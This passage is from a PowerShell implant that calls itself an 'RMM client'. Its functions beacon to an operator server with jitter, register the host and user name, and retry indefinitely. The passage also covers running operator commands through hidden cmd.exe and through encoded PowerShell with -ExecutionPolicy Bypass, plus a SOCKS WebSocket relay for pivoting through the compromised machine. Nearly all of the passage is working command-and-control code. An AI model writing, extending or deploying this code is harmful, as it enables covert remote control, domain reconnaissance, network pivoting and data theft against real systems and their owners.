            "SOCKS WebSocket send failed (state=$($WebSocket.State)): $($_.Exception.Message)"
        )
    }
}

function Receive-RmmSocksWsJson {
    param([System.Net.WebSockets.ClientWebSocket]$WebSocket)
    # Never cancel ReceiveAsync — on .NET, cancellation leaves the socket Aborted.
    if (-not (Test-RmmSocksWsOpen -WebSocket $WebSocket)) {
        return @{ op = 'close' }
    }
    $buf = New-Object byte[] 262144
    $seg = [System.ArraySegment[byte]]::new($buf)
    $sb = New-Object System.Text.StringBuilder
    try {
        while ($true) {
            $recv = $WebSocket.ReceiveAsync(
                $seg,
                [System.Threading.CancellationToken]::None
            ).GetAwaiter().GetResult()
            if ($recv.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
                return @{ op = 'close' }
            }
            [void]$sb.Append([System.Text.Encoding]::UTF8.GetString($buf, 0, $recv.Count))
            if ($recv.EndOfMessage) {
                try {
                    return ($sb.ToString() | ConvertFrom-Json)
                } catch {
                    return $null
                }
            }
        }
    } catch [System.Net.WebSockets.WebSocketException] {
        return @{ op = 'close' }
    } catch {
        if (-not (Test-RmmSocksWsOpen -WebSocket $WebSocket)) {
            return @{ op = 'close' }
        }
        throw
    }
}

function Invoke-RmmSocksDrainTcpToWs {
    param(
        [System.Net.WebSockets.ClientWebSocket]$WebSocket,
        [hashtable]$Headers,
        $EmptyPoll
    )
    $passes = if ($script:RmmSocksConnections.Count -gt 0) { 16 } else { 1 }
    for ($p = 0; $p -lt $passes; $p++) {
        $drain = Invoke-RmmSocksCycle -Headers $Headers -Poll $EmptyPoll -EmitResponsesOnly
        if (-not $drain.responses -or $drain.responses.Count -eq 0) { break }
        Send-RmmSocksResponsesWs -WebSocket $WebSocket -Responses $drain.responses
    }
}

function Invoke-RmmSocksHandleWsMessages {
    param(
        [System.Net.WebSockets.ClientWebSocket]$WebSocket,
        [hashtable]$Headers,
        $Messages
    )
    if ($null -eq $Messages -or $Messages.Count -eq 0) { return $null }
    foreach ($msg in $Messages) {
        if ($null -eq $msg) { continue }
        if ($msg.op -eq 'close') { return 'stop' }
        if ($msg.op -eq 'active' -and -not [bool]$msg.active) { return 'stop' }
        if ($msg.op -eq 'pong') { continue }
        if ($msg.op -eq 'tasks') {
            $taskList = Get-RmmSocksTasksFromPoll -Poll @{ active = $true; tasks = @($msg.tasks) }
            if ($taskList.Count -gt 0) {
                Invoke-RmmSocksProcessWsTasks -WebSocket $WebSocket -Headers $Headers -Tasks $taskList
            }
        }
    }
    return $null
}

function Connect-RmmSocksClientWebSocket {
    $info = Get-RmmSocksWsConnectInfo
    $ws = [System.Net.WebSockets.ClientWebSocket]::new()
    try {
        $ws.Options.KeepAliveInterval = [TimeSpan]::FromSeconds(20)
    } catch { }
    if ($beaconSecret) {
        $ws.Options.SetRequestHeader('X-RMM-Beacon-Token', $beaconSecret)
    }
    [void]$ws.Options.SetRequestHeader('Host', $info.HostHeader)
    $origin = $u.TrimEnd('/')
    if ($origin -match '(?i)^https?://') {
        $ws.Options.SetRequestHeader('Origin', $origin)
    }
    Write-RmmLog "SOCKS WS connect $($info.Uri) Host=$($info.HostHeader)" -Level DEBUG
    $lastErr = $null
    foreach ($attempt in 1..5) {
        if ($attempt -gt 1) { Start-Sleep -Milliseconds 400 }
        try {
            if ($ws.State -ne [System.Net.WebSockets.WebSocketState]::None) {
                $ws.Dispose()
                $ws = [System.Net.WebSockets.ClientWebSocket]::new()
                if ($beaconSecret) {
                    $ws.Options.SetRequestHeader('X-RMM-Beacon-Token', $beaconSecret)
                }
                [void]$ws.Options.SetRequestHeader('Host', $info.HostHeader)
                if ($origin -match '(?i)^https?://') {
                    $ws.Options.SetRequestHeader('Origin', $origin)
                }
            }
            $null = $ws.ConnectAsync($info.Uri, [System.Threading.CancellationToken]::None).GetAwaiter().GetResult()
            return $ws
        } catch {
            $lastErr = $_
        }
    }
    throw $lastErr
}

function Invoke-RmmSocksProcessWsTasks {
    param(
        [System.Net.WebSockets.ClientWebSocket]$WebSocket,
        [hashtable]$Headers,
        $Tasks
    )
    if ($null -eq $Tasks -or $Tasks.Count -eq 0) { return }
    Write-RmmSocksHostLine "[*] SOCKS WS: $($Tasks.Count) task(s)"
    $poll = @{ active = $true; tasks = $Tasks }
    $result = Invoke-RmmSocksCycle -Headers $Headers -Poll $poll -EmitResponsesOnly
    if ($result.responses -and $result.responses.Count -gt 0) {
        Send-RmmSocksResponsesWs -WebSocket $WebSocket -Responses $result.responses
    }
}

function Invoke-RmmSocksWsRelay {
    $ws = Connect-RmmSocksClientWebSocket
    Write-RmmSocksHostLine '[+] SOCKS WebSocket channel active (pull/push)'
    $headers = Get-RmmRequestHeaders
    $emptyPoll = @{ active = $true; tasks = @() }
    try {
        $boot = Receive-RmmSocksWsJson -WebSocket $ws
        if ((Invoke-RmmSocksHandleWsMessages -WebSocket $ws -Headers $headers -Messages @($boot)) -eq 'stop') {
            Write-RmmSocksHostLine '[*] SOCKS relay stopped on server'
            return
        }
        while (-not $RmmSocksChannelStop) {
            Invoke-RmmSocksDrainTcpToWs -WebSocket $ws -Headers $headers -EmptyPoll $emptyPoll
            $spin = 0
            $hadTasks = $true
            while ($hadTasks -and $spin -lt 64) {
                $spin++
                $hadTasks = $false
                Send-RmmSocksWsJson -WebSocket $ws -Message @{ op = 'pull' }
                $reply = Receive-RmmSocksWsJson -WebSocket $ws
                if ($null -eq $reply -or $reply.op -eq 'close') {
                    throw [System.IO.IOException]::new('SOCKS WebSocket closed by server')
                }
                if ($reply.op -eq 'active' -and -not [bool]$reply.active) {
                    Write-RmmSocksHostLine '[*] SOCKS relay stopped on server'
                    return
                }
                if ($reply.op -eq 'tasks') {
                    $taskList = Get-RmmSocksTasksFromPoll -Poll @{ active = $true; tasks = @($reply.tasks) }
                    if ($taskList.Count -gt 0) {
                        $hadTasks = $true
                        Invoke-RmmSocksProcessWsTasks -WebSocket $ws -Headers $headers -Tasks $taskList
                    }
                }
                Invoke-RmmSocksDrainTcpToWs -WebSocket $ws -Headers $headers -EmptyPoll $emptyPoll
            }
        }
    } finally {
        Close-RmmSocksWebSocket -WebSocket $ws
    }
}

function Invoke-RmmSocksHttpRelay {
    while (-not $RmmSocksChannelStop) {
        try {
            $headers = Get-RmmRequestHeaders
            $pollUrl = "$u/socks?id=$sessionId"
            $poll = Invoke-RmmRestMethod -Uri $pollUrl -Method Get -Headers $headers -RestErrorAction SilentlyContinue
            if (-not (Get-RmmSocksPollActive -Poll $poll)) {
                Write-RmmSocksHostLine '[*] SOCKS relay stopped on server'
                break
            }
            if (-not $script:RmmSocksChannelWasActive) {
                Write-RmmSocksHostLine '[+] SOCKS channel active (/socks HTTP poll)'
                $script:RmmSocksChannelWasActive = $true
            }
            $cycleOk = Invoke-RmmSocksCycle -Headers $headers -Poll $poll
            if ($cycleOk -eq $false) {
                Write-RmmSocksHostLine '[!] SOCKS cycle failed (check beacon token / server)'
            }
            Start-Sleep -Milliseconds 25
        } catch {
            Write-RmmSocksHostLine "[!] SOCKS channel error: $($_.Exception.Message)"
            Start-Sleep -Milliseconds 400
        }
    }
}

function Get-RmmSocksWorkerFunctionNames {
    # Dependency order: callees before callers; all must be re-defined inside the worker runspace.
    @(
        'Get-RandomUserAgent',
        'Get-RmmHttpStatusHint',
        'Get-RmmHttpErrorBody',
        'Convert-RmmHttpResponseContent',
        'Resolve-RmmTunnelIpv4',
        'Write-RmmLog',
        'Invoke-RmmRestMethod',
        'Get-RmmRequestHeaders',
        'Get-RmmSocksPollActive',
        'Get-RmmSocksTasksFromPoll',
        'Read-RmmSocksTcpChunk',
        'Invoke-RmmSocksCycle',
        'Get-RmmSocksWsConnectInfo',
        'Connect-RmmSocksClientWebSocket',
        'Test-RmmSocksWsOpen',
        'Close-RmmSocksWebSocket',
        'Send-RmmSocksWsJson',
        'Sort-RmmSocksTasks',
        'Receive-RmmSocksWsJson',
        'Send-RmmSocksResponsesWs',
        'Invoke-RmmSocksDrainTcpToWs',
        'Invoke-RmmSocksHandleWsMessages',
        'Invoke-RmmSocksProcessWsTasks',
        'Invoke-RmmSocksWsRelay',
        'Invoke-RmmSocksHttpRelay'
    )
}

function Import-RmmFunctionsIntoRunspace {
    param(
        [System.Management.Automation.PowerShell]$PowerShellInstance,
        [string[]]$FunctionNames
    )
    foreach ($name in $FunctionNames) {
        $cmd = Get-Command -Name $name -CommandType Function -ErrorAction Stop
        $def = $cmd.ScriptBlock.ToString()
        $null = $PowerShellInstance.AddScript("function global:$name { $def }", $false).Invoke()
        if ($PowerShellInstance.Streams.Error.Count -gt 0) {
            $errs = ($PowerShellInstance.Streams.Error | ForEach-Object { $_.Exception.Message }) -join '; '
            $PowerShellInstance.Streams.Error.Clear()
            throw "Failed to import function $name`: $errs"
        }
        $PowerShellInstance.Commands.Clear()
    }
    $null = $PowerShellInstance.AddScript(
        @'
if (-not (Get-Command Invoke-RmmRestMethod -CommandType Function -ErrorAction SilentlyContinue)) { throw 'SOCKS bootstrap: Invoke-RmmRestMethod missing' }
if (-not (Get-Command Get-RmmSocksTasksFromPoll -CommandType Function -ErrorAction SilentlyContinue)) { throw 'SOCKS bootstrap: Get-RmmSocksTasksFromPoll missing' }
if (-not (Get-Command New-Object -ErrorAction SilentlyContinue)) { throw 'SOCKS bootstrap: New-Object missing (session state)' }
'@,
        $false
    ).Invoke()
    if ($PowerShellInstance.Streams.Error.Count -gt 0) {
        $errs = ($PowerShellInstance.Streams.Error | ForEach-Object { $_.Exception.Message }) -join '; '
        $PowerShellInstance.Streams.Error.Clear()
        throw "SOCKS bootstrap verification failed: $errs"
    }
    $PowerShellInstance.Commands.Clear()
}

function Install-RmmSocksRunspaceHostLog {
    param([System.Management.Automation.PowerShell]$PowerShellInstance)
    $null = $PowerShellInstance.AddScript({
        function Write-RmmSocksHostLine {
            param([Parameter(Mandatory = $true)][string]$Message)
            if ($null -ne $script:RmmSocksLogQueue) {
                [void]$script:RmmSocksLogQueue.Enqueue($Message)
            }
        }
        function Write-RmmLog {
            param(
                [Parameter(Mandatory = $true)][string]$Message,
                [ValidateSet('INFO', 'WARN', 'ERROR', 'DEBUG')][string]$Level = 'INFO'
            )
            if ($Level -eq 'DEBUG' -and -not $script:RmmVerbose) { return }
            $prefix = switch ($Level) {
                'WARN'  { '[!]' }
                'ERROR' { '[-]' }
                'DEBUG' { '[dbg]' }
                default { '[*]' }
            }
            Write-RmmSocksHostLine "$prefix $Message"
        }
    }, $false).Invoke()
    if ($PowerShellInstance.Streams.Error.Count -gt 0) {
        $errs = ($PowerShellInstance.Streams.Error | ForEach-Object { $_.Exception.Message }) -join '; '
        $PowerShellInstance.Streams.Error.Clear()
        throw "SOCKS host log install failed: $errs"
    }
    $PowerShellInstance.Commands.Clear()
}

function New-RmmSocksRunspace {
    $fnNames = Get-RmmSocksWorkerFunctionNames
    $iss = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
    $rs = [runspacefactory]::CreateRunspace($iss)
    # UseNewThread: ReuseThread can leave this runspace as the thread DefaultRunspace and break the host beacon loop.
    $rs.ThreadOptions = 'UseNewThread'
    $rs.Open()
    $bootstrap = [PowerShell]::Create()
    $bootstrap.Runspace = $rs
    try {
        Import-RmmFunctionsIntoRunspace -PowerShellInstance $bootstrap -FunctionNames $fnNames
        Install-RmmSocksRunspaceHostLog -PowerShellInstance $bootstrap
    } finally {
        $bootstrap.Dispose()
    }
    return $rs
}

function Set-RmmSocksRunspaceVariables {
    param(
        [System.Management.Automation.Runspaces.Runspace]$Runspace,
        [hashtable]$Vars
    )
    foreach ($key in $Vars.Keys) {
        $Runspace.SessionStateProxy.SetVariable($key, $Vars[$key])
    }
}

function Start-RmmSocksChannelWorker {
    if ($script:RmmSocksWorker.Running) { return }

    try {
        $socksRs = New-RmmSocksRunspace
    } catch {
        Write-Host "[-] SOCKS channel worker failed to start: $($_.Exception.Message)" -ForegroundColor Red
        return
    }

    $socksCookie = New-Object System.Net.CookieContainer
    Set-RmmSocksRunspaceVariables -Runspace $socksRs -Vars @{
        u                              = $u
        sessionId                      = $sessionId
        beaconSecret                   = $beaconSecret
        httpProxy                      = $httpProxy
        httpProxyUseDefaultCredentials = $httpProxyUseDefaultCredentials
        RmmSocksChannelStop            = $false
        RmmSocksLogQueue               = $script:RmmSocksLogQueue
    }

    $ps = [PowerShell]::Create()
    $ps.Runspace = $socksRs
    [void]$ps.AddScript({
        param($Verbose, $Cookie, $Proxy, $LogQueue)
        $script:RmmVerbose = [bool]$Verbose
        $script:UsePersistentHttp = $true
        $script:RmmCookieContainer = $Cookie
        $script:RmmWebProxy = $Proxy
        $script:RmmSocksConnections = @{}
        $script:RmmSocksChannelWasActive = $false
        $script:RmmSocksLogQueue = $LogQueue
        $useHttpSocks = [bool]$httpProxy -and "$httpProxy".Trim().Length -gt 0
        if ($useHttpSocks) {
            Write-RmmSocksHostLine '[*] SOCKS using HTTP poll (WebSocket skipped when httpProxy is set)'
            Invoke-RmmSocksHttpRelay
        } else {
            $wsFail = 0
            while (-not $RmmSocksChannelStop -and $wsFail -lt 12) {
                try {
                    Invoke-RmmSocksWsRelay
                    break
                } catch {
                    $wsFail++
                    Write-RmmSocksHostLine "[!] SOCKS WebSocket error ($wsFail/12): $($_.Exception.Message)"
                    Start-Sleep -Seconds 2
                }
            }
            if (-not $RmmSocksChannelStop -and $wsFail -ge 12) {
                Write-RmmSocksHostLine '[!] SOCKS WebSocket unavailable; falling back to HTTP poll'
                Invoke-RmmSocksHttpRelay
            }
        }
        foreach ($id in @($script:RmmSocksConnections.Keys)) {
            try { $script:RmmSocksConnections[$id].Close() } catch { }
        }
        Write-RmmSocksHostLine '[*] SOCKS channel worker stopped'
    }).AddArgument([bool]$script:RmmVerbose).AddArgument($socksCookie).AddArgument($script:RmmWebProxy).AddArgument($script:RmmSocksLogQueue)
    try {
        $async = $ps.BeginInvoke()
    } catch {
        Write-Host "[-] SOCKS channel worker failed to start: $($_.Exception.Message)" -ForegroundColor Red
        $ps.Dispose()
        $socksRs.Close()
        return
    }
    [RmmHostAnchor]::Restore()

    $script:RmmSocksWorker.Running = $true
    $script:RmmSocksWorker.Runspace = $socksRs
    $script:RmmSocksWorker.PowerShell = $ps
    $script:RmmSocksWorker.Async = $async
    Write-Host "[*] SOCKS channel started (operator ran socks; logs below)" -ForegroundColor Cyan
    Drain-RmmSocksHostLog
    [RmmHostAnchor]::Restore()
}

function Stop-RmmSocksChannelWorker {
    if (-not $script:RmmSocksWorker.Running) { return }
    $rs = $script:RmmSocksWorker.Runspace
    $ps = $script:RmmSocksWorker.PowerShell
    if ($rs) {
        try { $rs.SessionStateProxy.SetVariable('RmmSocksChannelStop', $true) } catch { }
    }
    if ($ps -and $script:RmmSocksWorker.Async) {
        try { $ps.EndInvoke($script:RmmSocksWorker.Async) } catch { }
    }
    if ($ps) { $ps.Dispose() }
    if ($rs) { $rs.Close() }
    $script:RmmSocksWorker.Running = $false
    $script:RmmSocksWorker.Runspace = $null
    $script:RmmSocksWorker.PowerShell = $null
    $script:RmmSocksWorker.Async = $null
    Drain-RmmSocksHostLog
    Write-Host "[*] SOCKS channel stopped" -ForegroundColor Yellow
    [RmmHostAnchor]::Restore()
}

# 2>&1 on native exes turns stderr into ErrorRecord; Out-String then dumps script position noise.
function ConvertTo-RmmPlainText {
    param([object[]]$Chunks)
    if ($null -eq $Chunks -or $Chunks.Count -eq 0) { return '' }
    ($Chunks | ForEach-Object {
        if ($_ -is [System.Management.Automation.ErrorRecord]) {
            $_.Exception.Message.TrimEnd()
        } elseif ($_ -is [System.Exception]) {
            $_.Message
        } else {
            "$_"
        }
    }) -join [Environment]::NewLine
}

function Apply-RmmCwdFromCmdOutput {
    param([string]$Text)
    if ([string]::IsNullOrWhiteSpace($Text)) { return $Text }
    $last = $null
    $kept = New-Object System.Collections.ArrayList
    foreach ($line in ($Text -split "`r?`n")) {
        if ($line -match '^\s*RMM_CWD_SIG:(.+)\s*$') {
            $last = $Matches[1].Trim()
            continue
        }
        [void]$kept.Add($line)
    }
    if ($last) {
        try {
            if (Test-Path -LiteralPath $last -PathType Container) {
                $script:RmmShellCwd = (New-Object System.IO.DirectoryInfo -ArgumentList $last).FullName
            }
        } catch { }
    }
    return ($kept -join [Environment]::NewLine).TrimEnd()
}

function Quote-RmmWindowsProcessArgument {
    param([AllowNull()][string]$Argument)
    if ($null -eq $Argument) { return '""' }
    if ($Argument.Length -gt 0 -and $Argument -notmatch '[\s"\\]') {
        return $Argument
    }
    $sb = New-Object System.Text.StringBuilder
    [void]$sb.Append('"')
    $backslashes = 0
    foreach ($ch in $Argument.ToCharArray()) {
        if ($ch -eq '\') {
            $backslashes++
            continue
        }
        if ($ch -eq '"') {
            [void]$sb.Append('\', ($backslashes * 2 + 1))
            $backslashes = 0
            [void]$sb.Append('"')
        } else {
            if ($backslashes -gt 0) {
                [void]$sb.Append('\', $backslashes)
                $backslashes = 0
            }
            [void]$sb.Append($ch)
        }
    }
    if ($backslashes -gt 0) {
        [void]$sb.Append('\', ($backslashes * 2))
    }
    [void]$sb.Append('"')
    return $sb.ToString()
}

function Join-RmmWindowsProcessArguments {
    param([Parameter(Mandatory = $true)][string[]]$ArgumentList)
    $parts = foreach ($arg in $ArgumentList) {
        if ($null -eq $arg) { Quote-RmmWindowsProcessArgument -Argument $null }
        elseif ($arg -eq '') { '""' }
        else { Quote-RmmWindowsProcessArgument -Argument $arg }
    }
    return ($parts -join ' ')
}

function Invoke-RmmHiddenProcessWait {
    param(
        [Parameter(Mandatory = $true)][string]$FilePath,
        [string[]]$ArgumentList,
        [string]$Arguments,
        [string]$WorkingDirectory
    )
    if (-not $Arguments) {
        if (-not $ArgumentList) {
            throw 'Invoke-RmmHiddenProcessWait requires -ArgumentList or -Arguments.'
        }
        $Arguments = Format-RmmRcloneProcessArgs -ArgumentList $ArgumentList
    }
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $FilePath
    $psi.Arguments = $Arguments
    if ($WorkingDirectory) {
        $psi.WorkingDirectory = $WorkingDirectory
    }
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $proc = New-Object System.Diagnostics.Process
    $proc.StartInfo = $psi
    [void]$proc.Start()
    $stdoutTask = $proc.StandardOutput.ReadToEndAsync()
    $stderrTask = $proc.StandardError.ReadToEndAsync()
    $proc.WaitForExit()
    return [pscustomobject]@{
        ExitCode = $proc.ExitCode
        StdOut   = $stdoutTask.GetAwaiter().GetResult()
        StdErr   = $stderrTask.GetAwaiter().GetResult()
    }
}

function Join-RmmProcessOutputText {
    param(
        [Parameter(Mandatory = $true)]$Result,
        [string]$EmptyExitLabel = ''
    )
    $parts = @()
    if ($Result.StdOut.TrimEnd().Length) { $parts += $Result.StdOut.TrimEnd() }
    if ($Result.StdErr.TrimEnd().Length) { $parts += $Result.StdErr.TrimEnd() }
    $text = $parts -join [Environment]::NewLine
    if ($EmptyExitLabel -and $Result.ExitCode -ne 0 -and -not $text.Trim()) {
        $text = "($EmptyExitLabel exited with code $($Result.ExitCode))"
    }
    return $text
}

function Remove-RmmClixmlProgressOutput {
    param([string]$Text)
    if ([string]::IsNullOrWhiteSpace($Text)) { return $Text }
    if ($Text -notmatch '(?s)#< CLIXML') { return $Text }
    return ($Text -replace '(?m)^\s*#< CLIXML[\s\S]*?</Objs>\s*', '').TrimEnd()
}

function Build-RmmEncodedPowerShellScript {
    param([Parameter(Mandatory = $true)][string]$Inner)
    $wdEsc = $script:RmmShellCwd -replace "'", "''"
    @(
        '$ProgressPreference = ''SilentlyContinue'''
        "Set-Location -LiteralPath '$wdEsc' -ErrorAction SilentlyContinue"
        $Inner
        "Write-Output ('RMM_CWD_SIG:' + (Get-Location).Path)"
    ) -join "`r`n"
}

function Invoke-RmmHiddenEncodedPowerShell {
    param(
        [Parameter(Mandatory = $true)][string]$ExecutablePath,
        [Parameter(Mandatory = $true)][string]$EncodedCommand
    )
    $result = Invoke-RmmHiddenProcessWait -FilePath $ExecutablePath -ArgumentList @(
        '-NoProfile', '-ExecutionPolicy', 'Bypass', '-NoLogo', '-NonInteractive',
        '-WindowStyle', 'Hidden',
        '-EncodedCommand', $EncodedCommand
    )
    $text = Join-RmmProcessOutputText -Result $result
    return (Remove-RmmClixmlProgressOutput -Text $text)
}

function Get-RmmPlainCmdOutput {
    param([Parameter(Mandatory)][string]$InnerCommand)
    $base = $script:RmmShellCwd
    if (-not (Test-Path -LiteralPath $base -PathType Container)) {
        $base = $env:USERPROFILE
        $script:RmmShellCwd = $base
    }
    $workDir = (New-Object System.IO.DirectoryInfo -ArgumentList $base).FullName
    # Run via a temp .cmd file so inner quotes, %CD%, and H:\ never pass through /S /c "" or CreateProcess
    # quoting of the operator line itself (net group "Domain Admins" /domain, whoami on H:\, etc.).
    $scriptFile = [System.IO.Path]::Combine(
        [System.IO.Path]::GetTempPath(),
        ('rmm-' + [Guid]::NewGuid().ToString('N') + '.cmd')
    )
    try {
        $batch = (@(
            '@echo off'
            'setlocal EnableExtensions'
            $InnerCommand
            'echo RMM_CWD_SIG:%CD%'
        ) -join "`r`n") + "`r`n"
        [System.IO.File]::WriteAllText($scriptFile, $batch, [System.Text.Encoding]::ASCII)
        $cmdArgs = Join-RmmWindowsProcessArguments -ArgumentList @('/d', '/c', $scriptFile)
        $result = Invoke-RmmHiddenProcessWait -FilePath 'cmd.exe' -Arguments $cmdArgs -WorkingDirectory $workDir
        $text = Join-RmmProcessOutputText -Result $result -EmptyExitLabel 'cmd'
        return (Apply-RmmCwdFromCmdOutput -Text $text)
    } finally {
        if (Test-Path -LiteralPath $scriptFile) {
            Remove-Item -LiteralPath $scriptFile -Force -ErrorAction SilentlyContinue
        }
    }
}

# Default: cmd.exe. Prefix PS: or powershell: for Windows PowerShell; pwsh: for PS 7 if installed.
# Prefix cmd: forces CMD. Uses -EncodedCommand for PS so quotes and pipelines are reliable.

# CMD does not treat '...' as quoting (unlike bash); convert simple 'segment' pairs to "segment" for net, etc.
function Convert-RmmCmdSingleQuotesForCmd {
    param([string]$Line)
    if ([string]::IsNullOrEmpty($Line)) { return $Line }
    $sb = New-Object System.Text.StringBuilder
    $i = 0
    $len = $Line.Length
    $sq = [char]39
    while ($i -lt $len) {
        if ($Line[$i] -eq $sq) {
            $end = $Line.IndexOf($sq, $i + 1)
            if ($end -lt 0) {
                [void]$sb.Append($Line[$i])
                $i++
                continue
            }
            $inner = $Line.Substring($i + 1, $end - $i - 1)
            $innerEsc = $inner -replace '"', '""'
            [void]$sb.Append('"').Append($innerEsc).Append('"')
            $i = $end + 1
        } else {
            [void]$sb.Append($Line[$i])
            $i++
        }
    }
    return $sb.ToString()
}

function Normalize-RmmNetGroupCommand {
    param([string]$Line)
    if ([string]::IsNullOrWhiteSpace($Line)) { return $Line }
    # net group /domain <name> is invalid for net.exe; group name must precede /domain.
    if ($Line -match '^(?i)(net\s+group)\s+/domain(?:\s+|$)(.*)$') {
        $rest = $Matches[2].Trim()
        if ($rest.Length -gt 0) {
            return ($Matches[1] + ' ' + $rest + ' /domain')
        }
    }
    return $Line
}

function Normalize-RmmCmdExeLine {
    param([string]$Line)
    $t = $Line.Trim()
    # CMD has no `ls`; map common Unix habit so operators are not punished.
    if ($t -match '^(?i)ls$') { return 'dir' }
    $line = Normalize-RmmNetGroupCommand -Line $Line
    return (Convert-RmmCmdSingleQuotesForCmd -Line $line)
}

function Invoke-RmmUserCommand {
    param([Parameter(Mandatory = $true)][string]$RawCommand)
    $trimmed = $RawCommand.TrimStart()
    try {
        if ($trimmed -match '^(?i)(?:powershell|ps)\s*:\s*(.*)$') {
            $inner = $Matches[1]
            if ([string]::IsNullOrWhiteSpace($inner)) { return 'Error: empty script after PS: or powershell:' }
            $innerPs = Build-RmmEncodedPowerShellScript -Inner $inner
            $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($innerPs))
            $txt = Invoke-RmmHiddenEncodedPowerShell -ExecutablePath 'powershell.exe' -EncodedCommand $enc
            return (Apply-RmmCwdFromCmdOutput -Text $txt)
        }
        if ($trimmed -match '^(?i)pwsh\s*:\s*(.*)$') {
            $inner = $Matches[1]
            if ([string]::IsNullOrWhiteSpace($inner)) { return 'Error: empty script after pwsh:' }
            $innerPs = Build-RmmEncodedPowerShellScript -Inner $inner
            $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($innerPs))
            $launcher = if (Get-Command pwsh.exe -ErrorAction SilentlyContinue) { 'pwsh.exe' } else { 'powershell.exe' }
            $txt = Invoke-RmmHiddenEncodedPowerShell -ExecutablePath $launcher -EncodedCommand $enc
            return (Apply-RmmCwdFromCmdOutput -Text $txt)
        }
        if ($trimmed -match '^(?i)cmd\s*:\s*(.*)$') {
            return [string](Get-RmmPlainCmdOutput -InnerCommand (Normalize-RmmCmdExeLine -Line $Matches[1]))
        }
        return [string](Get-RmmPlainCmdOutput -InnerCommand (Normalize-RmmCmdExeLine -Line $RawCommand))
    } catch {
        return [string]$_.Exception.Message
    }
}

function Get-RmmWebExceptionResponse {
    param($ErrorRecord)
    $ex = $ErrorRecord.Exception
    if ($ex.InnerException -is [System.Net.WebException]) {
        $ex = $ex.InnerException
    }
    if ($ex -is [System.Net.WebException] -and $ex.Response) {
        return $ex.Response
    }
    return $null
}

function Test-RmmSessionTerminated {
    param($ErrorRecord)
    try {
        $resp = Get-RmmWebExceptionResponse -ErrorRecord $ErrorRecord
        if ($resp -and [int]$resp.StatusCode -eq 403) {
            $body = Get-RmmHttpErrorBody -Response $resp
            if ($body -match 'TERMINATED') { return $true }
        }
        # Invoke-RmmRestMethod reads the error body before throwing; the stream may be empty here.
        $ex = $ErrorRecord.Exception
        while ($null -ne $ex) {
            if ([string]$ex.Message -match 'TERMINATED') { return $true }
            $ex = $ex.InnerException
        }
    } catch {}
    return $false
}

function Register-RmmSession {
    param(
        [switch]$Quiet,
        [switch]$Reconnect
    )
    $registerQs = "id=$([uri]::EscapeDataString($sessionId))&h=$([uri]::EscapeDataString($computerName))&u=$([uri]::EscapeDataString($userName))"
    if (-not $script:RmmRegisterConfigSynced -or $Reconnect) {
        $registerQs += "&s=$($script:baseSleepSeconds)&j=$($script:jitterPercent)&sync=1"
    }
    $registerUrl = "$u/register?$registerQs"
    $headers = Get-RmmRequestHeaders
    Write-RmmLog "Register GET $registerUrl (beacon=$([bool]$beaconSecret))" -Level DEBUG
    try {
        $null = Invoke-RmmRestMethod -Uri $registerUrl -Method Get -Headers $headers -RestErrorAction Stop
        $script:RmmEverRegistered = $true
        $script:RmmRegisterConfigSynced = $true
        if (-not $Quiet) {
            if ($Reconnect) {
                Write-Host "[+] Reconnected to RMM server (ID: $sessionId)" -ForegroundColor Green
            } else {
                Write-Host "[+] Registered with RMM server (ID: $sessionId)" -ForegroundColor Green
            }
        }
        return $true
    } catch {
        if (Test-RmmSessionTerminated -ErrorRecord $_) {
            Write-Host "[*] Session killed on server (TERMINATED); exiting" -ForegroundColor Yellow
            exit 0
        }
        throw
    }
}

# Register with RMM server (retries until success; default = no limit)
$registered = $false
$registerAttempt = 0

Write-Host "[*] Starting RMM client with Session ID: $sessionId" -ForegroundColor Cyan
Write-Host "[*] Server URL: $u" -ForegroundColor Cyan
if ($beaconSecret) {
    Write-Host "[*] Beacon token: set" -ForegroundColor Cyan
} else {
    Write-Host "[!] Beacon token: NOT set — server will reject unless started with --insecure" -ForegroundColor Yellow
}
if ($script:RmmWebProxy) {
    $proxyMsg = "[*] HTTP proxy: $httpProxy"
    if ($httpProxyUseDefaultCredentials) { $proxyMsg += ' (default credentials)' }
    Write-Host $proxyMsg -ForegroundColor Cyan
}
if ($script:RmmVerbose) {
    Write-Host "[*] Verbose HTTP logging enabled" -ForegroundColor DarkGray
} else {
    Write-Host "[*] Tip: set `$verboseHttp = `$true for per-request URL, wire IP, and error bodies" -ForegroundColor DarkGray
}
Write-Host "[*] Default beacon: $baseSleepSeconds seconds with $jitterPercent% jitter" -ForegroundColor Cyan
Write-Host "[*] Connection failures retry indefinitely (only explicit server kill or __EXIT__ stops the client)" -ForegroundColor DarkGray
if ($script:UsePersistentHttp) {
    Write-Host "[*] HTTP: persistent cookies + TCP keep-alive, IPv4-only" -ForegroundColor DarkGray
} else {
    Write-Host "[*] HTTP: IPv4-only, KeepAlive=false (set `$persistentHttp = `$true for persistent TCP)" -ForegroundColor DarkGray
}
if ($script:DownloadBurst) {
    Write-Host "[*] Download: burst mode (back-to-back chunk POSTs)" -ForegroundColor DarkGray
} else {
    Write-Host "[*] Download: paced like beacon (sleep+jitter between chunk POSTs; set `$downloadBurst = `$true for burst)" -ForegroundColor DarkGray
}

while (-not $registered) {
    $registerAttempt++
    try {
        $registered = Register-RmmSession
        $currentRetry = 0
    } catch {
        if (Test-RmmSessionTerminated -ErrorRecord $_) {
            Write-Host "[*] Session killed on server (TERMINATED); exiting" -ForegroundColor Yellow
            exit 0
        }
        Write-Host "[-] Registration failed (attempt $registerAttempt, retrying): $($_.Exception.Message)" -ForegroundColor Red
        Write-RmmHttpFailure -ErrorRecord $_ -Context "register"
        $backoffTime = Get-BackoffSleep -retryCount $registerAttempt
        Write-Host "[*] Server unreachable — retrying registration in $backoffTime seconds..." -ForegroundColor Yellow
    }
}

# Main loop — beacon (/register, /cmd, /result); SOCKS channel starts when server socks_active is true
while ($true) {
    try {
        [RmmHostAnchor]::Restore()
        if (-not $script:RmmFastPoll) {
            $null = Get-JitteredSleep -baseSeconds $script:baseSleepSeconds -jitterPercent $script:jitterPercent
        } else {
            $script:RmmFastPoll = $false
        }

        Write-Host "[*] Beacon poll..." -ForegroundColor DarkGray
        $headers = Get-RmmRequestHeaders
